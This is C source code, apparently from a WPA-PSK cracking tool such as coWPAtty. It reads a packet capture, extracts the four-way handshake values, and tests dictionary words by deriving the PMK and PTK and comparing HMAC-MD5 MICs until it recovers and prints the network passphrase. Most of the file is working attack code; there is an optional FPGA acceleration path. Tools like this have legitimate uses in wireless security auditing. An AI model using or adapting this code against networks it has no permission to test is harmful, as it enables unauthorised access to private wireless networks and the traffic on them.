int dictfile_attack(struct user_opt *opt, char *passphrase, 
	struct crack_data *cdata)
{
	
	FILE *fp;
	int fret;
	u8 pmk[32];
	u8 ptk[64];
	u8 keymic[16];
	struct wpa_ptk *ptkset;

#ifdef FPGA
//	int i;
	opt_g = opt;
	cdata_g = cdata;
	if(usefpga)
		initfpga();
#endif

	/* Open the dictionary file */
	if (*opt->dictfile == '-') {
		printf("Using STDIN for words.\n");
		fp = stdin;
	} else {
		fp = fopen(opt->dictfile, "r");
		if (fp == NULL) {
			perror("fopen");
			exit(-1);
		}
	}


	while (feof(fp) == 0 && sig == 0) {

		/* Populate "passphrase" with the next word */
		fret = nextdictword(passphrase, fp);
		if (fret < 0) {
			break;
		}

		if (opt->verbose > 1) {
			printf("Testing passphrase: %s\n", passphrase);
		}

		/*
		 * Test length of word.  IEEE 802.11i indicates the passphrase
		 * must be at least 8 characters in length, and no more than 63 
		 * characters in length. 
		 */
		if (fret < 8 || fret > 63) {
			if (opt->verbose) {
				printf("Invalid passphrase length: %s (%d).\n",
				       passphrase, strlen(passphrase));
			}
			continue;
		} else {
			/* This word is good, increment the words tested
			counter */
			wordstested++;
		}

		/* Status display */
#ifdef FPGA
		if ((wordstested % 100) == 0) {
#else
		if ((wordstested % 1000) == 0) {
#endif
			printf("key no. %ld: %s\n", wordstested, passphrase);
			fflush(stdout);
		}

		if (opt->verbose > 1) {
			printf("Calculating PMK for \"%s\".\n", passphrase);
		}
		
		pbkdf2_sha1(passphrase, opt->ssid, strlen(opt->ssid), 4096,
			    pmk, sizeof(pmk), USECACHED);

#ifdef FPGA
		if (!usefpga) {
#endif
		if (opt->verbose > 2) {
			printf("PMK is");
			lamont_hdump(pmk, sizeof(pmk));
		}

		if (opt->verbose > 1) {
			printf("Calculating PTK with collected data and "
			       "PMK.\n");
		}

#ifdef FPGA
/*
		for(i = 0; i < 32; i++)
			printf("%02x ", pmk[i]);
		printf("\n");
*/
#endif

		wpa_pmk_to_ptk(pmk, cdata->aa, cdata->spa, cdata->anonce,
			       cdata->snonce, ptk, sizeof(ptk));

		if (opt->verbose > 2) {
			printf("Calculated PTK for \"%s\" is", passphrase);
			lamont_hdump(ptk, sizeof(ptk));
		}

		ptkset = (struct wpa_ptk *)ptk;

		if (opt->verbose > 1) {
			printf("Calculating hmac-MD5 Key MIC for this "
			       "frame.\n");
		}

		hmac_md5(ptkset->mic_key, 16, cdata->eapolframe,
			 sizeof(cdata->eapolframe), keymic);

		if (opt->verbose > 2) {
			printf("Calculated MIC with \"%s\" is", passphrase);
			lamont_hdump(keymic, sizeof(keymic));
		}

		if (memcmp(&cdata->keymic, &keymic, sizeof(keymic)) == 0) {
			return 0;
		} else {
			continue;
		}
#ifdef FPGA
		}
#endif
	}

#ifdef FPGA
	if(usefpga) {	
		printf("waiting..."); fflush(stdout);
		finishreg();
		printf("\ndone\n");
	}
#endif

	return 1;
}

int main(int argc, char **argv)
{
	struct user_opt opt;
	struct crack_data cdata;
	struct capture_data capdata;
	struct wpa_eapol_key *eapkeypacket;
	u8 eapolkey_nomic[99];
	struct timeval start, end;
	int ret;
	char passphrase[MAXPASSLEN + 1];

	printf("%s %s - WPA-PSK dictionary attack. <*****@*****.**>\n",
	       PROGNAME, VER);

	memset(&opt, 0, sizeof(struct user_opt));
	memset(&capdata, 0, sizeof(struct capture_data));
	memset(&cdata, 0, sizeof(struct crack_data));
	memset(&eapolkey_nomic, 0, sizeof(eapolkey_nomic));

	/* Collect and test command-line arguments */
	parseopts(&opt, argc, argv);
	testopts(&opt);
	printf("\n");

	/* Populate capdata struct */
	strncpy(capdata.pcapfilename, opt.pcapfile,
		sizeof(capdata.pcapfilename));
	if (openpcap(&capdata) != 0) {
		printf("Unsupported or unrecognized pcap file.\n");
		exit(1);
	}

	/* populates global *packet */
	while (getpacket(&capdata) > 0) {
		if (opt.verbose > 2) {
			lamont_hdump(packet, h->len);
		}
		/* test packet for data that we are looking for */
		if (memcmp(&packet[capdata.l2type_offset], DOT1X_LLCTYPE, 2) ==
		    0 && (h->len >
			capdata.l2type_offset + sizeof(struct wpa_eapol_key))) {
			/* It's a dot1x frame, process it */
			handle_dot1x(&cdata, &capdata);
			if (cdata.aaset && cdata.spaset && cdata.snonceset &&
			    cdata.anonceset && cdata.keymicset
			    && cdata.eapolframeset) {
				/* We've collected everything we need. */
				break;
			}
		}
	}

	closepcap(&capdata);

	if (!(cdata.aaset && cdata.spaset && cdata.snonceset &&
	      cdata.anonceset && cdata.keymicset && cdata.eapolframeset)) {
		printf("End of pcap capture file, incomplete TKIP four-way "
		       "exchange.  Try using a\ndifferent capture.\n");
		exit(1);
	} else {
		printf("Collected all necessary data to mount crack against "
		       "passphrase.\n");
	}

	if (opt.verbose > 1) {
		dump_all_fields(cdata);
	}

	/* Zero mic and length data for hmac-md5 calculation */
	eapkeypacket =
	    (struct wpa_eapol_key *)&cdata.eapolframe[EAPDOT1XOFFSET];
	memset(&eapkeypacket->key_mic, 0, sizeof(eapkeypacket->key_mic));
	eapkeypacket->key_data_length = 0;

	printf("Starting dictionary attack.  Please be patient.\n");
	fflush(stdout);

//	signal(SIGINT, cleanup);
//	signal(SIGTERM, cleanup);
//	signal(SIGQUIT, cleanup);

	gettimeofday(&start, NULL);
#ifdef FPGA
	start_g = start;
#endif

	if (!IsBlank(opt.hashfile)) {
		ret = hashfile_attack(&opt, passphrase, &cdata);
	} else if (!IsBlank(opt.dictfile)) {
		ret = dictfile_attack(&opt, passphrase, &cdata);
	} else {
		usage("Must specify dictfile or hashfile (-f or -d)");
		exit(1);
	}

	if (ret == 0) {
		printf("\nThe PSK is \"%s\".\n", passphrase);
	} else {
		printf("Unable to identify the PSK from the dictionary file. " 
	       		"Try expanding your\npassphrase list, and double-check"
		        " the SSID.  Sorry it didn't work out.\n");
	}

	gettimeofday(&end, NULL);
	printstats(start, end, wordstested);
	return (1);
}